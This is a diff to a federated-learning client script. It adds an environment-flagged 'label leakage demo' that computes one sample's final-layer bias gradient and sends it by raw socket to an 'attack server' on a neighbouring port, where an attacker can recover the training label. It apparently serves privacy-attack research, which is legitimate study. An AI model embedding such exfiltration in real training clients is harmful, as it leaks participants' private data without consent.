@@ -65,38 +65,49 @@ def main():
             except Exception as e:
                 print(f"[client] error receiving global weights: {e}. exiting.", flush=True)
                 return
-            if os.environ.get("LEAK_ONCE") == "1":
+            if os.environ.get("LEAK_LABEL_ONLY") == "1":
                 try:
+                    # Rebuild model from global weights
                     model = SmallCNN(pretrained=False)
                     model.load_state_dict(state_dict)
                     model.to(device).train()
 
-                    model.train()
-                    x, y = next(iter(loader))                # take ONE batch from this shard
+                    # Use ONE sample to get a single-example gradient
+                    x, y = next(iter(loader))
                     x0, y0 = x[:1].to(device), y[:1].to(device)
+
                     model.zero_grad()
                     logits = model(x0)
                     loss = F.cross_entropy(logits, y0)
-                    grads = torch.autograd.grad(loss, model.parameters(), create_graph=False)
 
-                    # prepare payload: list of gradient tensors (CPU) + one label
+                    # Grab grads and map to param names to find final layer bias ("fc2.bias")
+                    grads = torch.autograd.grad(loss, model.parameters(), create_graph=False)
+                    name_list = [n for n, _ in model.named_parameters()]
+                    grads_by_name = {name_list[i]: g.detach().cpu() for i, g in enumerate(grads)}
+
+                    if "fc2.bias" not in grads_by_name:
+                        raise RuntimeError("fc2.bias gradient not found (check model param names)")
+
+                    fc2_bias_grad = grads_by_name["fc2.bias"]  # length=10
+
                     payload = {
-                        "grads": [g.detach().cpu() for g in grads],
-                        "label": int(y0[0].item()) if y0.ndim > 0 else int(y0.item())
+                        "fc2_bias_grad": fc2_bias_grad,   # attacker will do argmin to get true label
+                        "note": "label leakage demo"
                     }
                     data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)
 
-                    # send to attack server on host:(port+1)
+                    # Send to attack server on port+1 (e.g., 12346)
                     atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    atk.settimeout(3.0)
                     atk.connect((args.host, args.port + 1))
                     atk.sendall(len(data).to_bytes(8, "big"))
                     atk.sendall(data)
                     atk.close()
-                    print("[client] leaked 1-batch gradient to attack server", flush=True)
+                    print("[client] leaked last-layer bias gradient (label-only) to attack server", flush=True)
                 except Exception as e:
-                    print(f"[client] leak failed: {e}", flush=True)
+                    print(f"[client] label-only leak failed: {e}", flush=True)
                 finally:
-                    os.environ["LEAK_ONCE"] = "0"
+                    os.environ["LEAK_LABEL_ONLY"] = "0"
 
             print(f"[client] received W_k ({_count_params(state_dict):,} params). training 1 local epoch…", flush=True)
 
